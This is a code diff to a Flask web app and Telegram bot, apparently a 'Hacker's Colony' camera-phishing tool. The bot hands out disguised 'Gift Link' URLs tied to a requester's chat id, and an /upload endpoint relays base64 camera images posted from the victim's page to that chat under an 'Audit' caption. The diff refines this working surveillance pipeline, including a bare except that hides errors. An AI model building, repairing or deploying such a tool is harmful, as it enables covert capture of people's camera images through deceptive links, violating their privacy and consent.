@@ -7,7 +7,7 @@ app = Flask(__name__)
 # --- Configuration ---
 BOT_TOKEN = os.getenv('BOT_TOKEN')
 ADMINS = [518067190, 7162565886] 
-CONTACT_OWNER_LINK = "https://t.me/HackersColony"
+CONTACT_SUPPORT_LINK = "tg://user?id=518067190"
 TG_CHANNEL = "https://t.me/HackersColony"
 YT_CHANNEL = "https://youtube.com/@hackers_colony_tech?si=EXxJtogSUPc8Q4zM"
 
@@ -38,20 +38,30 @@ def start(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
+    user_id = call.message.chat.id
+    
     if call.data == "check_join":
-        markup = types.InlineKeyboardMarkup(row_width=2)
-        markup.add(
-            types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"),
-            types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"),
-            types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"),
-            types.InlineKeyboardButton("👨‍💻 Contact Owner", url=CONTACT_OWNER_LINK)
-        )
-        bot.edit_message_text("<b>Welcome Back to Hacker's Colony! 🎯</b>\nSelect your camera mode:", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
+        # Layout as per your request
+        markup = types.InlineKeyboardMarkup()
+        btn_front = types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front")
+        btn_back = types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back")
+        btn_dual = types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual")
+        btn_support = types.InlineKeyboardButton("🧑‍💻 Contact Support", url=CONTACT_SUPPORT_LINK)
+        
+        # Adding buttons in the specific grid format
+        markup.row(btn_front, btn_back)
+        markup.row(btn_dual)
+        markup.row(btn_support)
+        
+        bot.edit_message_text("<b>Welcome Back to Hacker's Colony! 🎯</b>\nSelect your camera mode:", user_id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
 
-    elif call.data.startswith("m_"):
-        mode = call.data.split("_")[1]
-        link = f"{request.host_url.rstrip('/')}?m={mode}&uid={call.message.chat.id}"
-        bot.send_message(call.message.chat.id, f"🎁 <b>Your Gift Link:</b>\n\n<code>{link}</code>", parse_mode='HTML')
+    elif "m_" in call.data:
+        mode = call.data.replace("m_", "")
+        base_url = request.host_url.rstrip('/')
+        link = f"{base_url}/?m={mode}&uid={user_id}"
+        
+        bot.answer_callback_query(call.id, "Link Generated! ✅")
+        bot.send_message(user_id, f"🎁 <b>Your Gift Link:</b>\n\n<code>{link}</code>", parse_mode='HTML')
 
 @bot.message_handler(commands=['broadcast'])
 def broadcast(message):
@@ -72,9 +82,12 @@ def index():
 @app.route('/upload', methods=['POST'])
 def upload():
     data = request.json
-    img_data = base64.b64decode(data.get('image').split(',')[1])
-    caption = f"🛡️ <b>Audit:</b> {data.get('mode').upper()} MODE\n✨ Created by Roshan Ali ✨"
-    bot.send_photo(data.get('uid'), img_data, caption=caption, parse_mode='HTML')
+    try:
+        img_data = base64.b64decode(data.get('image').split(',')[1])
+        caption = f"🛡️ <b>Audit:</b> {data.get('mode').upper()} MODE\n✨ Created by Roshan Ali ✨"
+        bot.send_photo(data.get('uid'), img_data, caption=caption, parse_mode='HTML')
+    except:
+        pass
     return jsonify({"status": "success"})
 
 if __name__ == "__main__":
@@ -85,10 +98,10 @@ if __name__ == "__main__":
         while True:
             try:
                 bot.remove_webhook()
-                bot.polling(none_stop=True, interval=2, timeout=40)
-            except Exception as e:
-                time.sleep(15)
+                bot.polling(none_stop=True, interval=2, timeout=60)
+            except Exception:
+                time.sleep(10)
 
     threading.Thread(target=run_bot, daemon=True).start()
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
-    
+        
